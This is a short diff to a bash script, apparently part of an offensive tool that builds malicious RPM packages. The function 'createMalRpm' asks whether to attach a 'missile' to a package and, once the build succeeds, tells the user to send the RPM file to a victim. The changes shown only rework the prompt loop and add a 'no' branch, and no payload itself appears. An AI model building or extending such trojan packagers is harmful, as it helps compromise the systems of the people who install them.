@@ -45,9 +45,10 @@ EOF
 }
 createMalRpm() {
     
-    while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
-	  read $opt -e inmissile
-    do
+    while true;do
+	
+	printf "\n${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; read $opt -e inmissile
+	
 	case $inmissile in
 	    y)
 
@@ -78,12 +79,15 @@ createMalRpm() {
 		if [[ $? == 0 ]];then
 		    printf "${open}${light}${green}Ok we are done here..${close}\n"
 		    printf "${open}${light}${green}You can now send the rpm file to your victim${close}\n"
-		    box3d
 		    break
 		fi
 		    
 		printf "${open}${light}${red}Error encountered while building the rpm package${close}\n"
 		exit 2
+		;;
+	    n)
+		makePackageFrom
+		
 		;;
 	    *)
 		printf "${open}${light}${red}%s${close}" "Invalid Response" && continue ;;
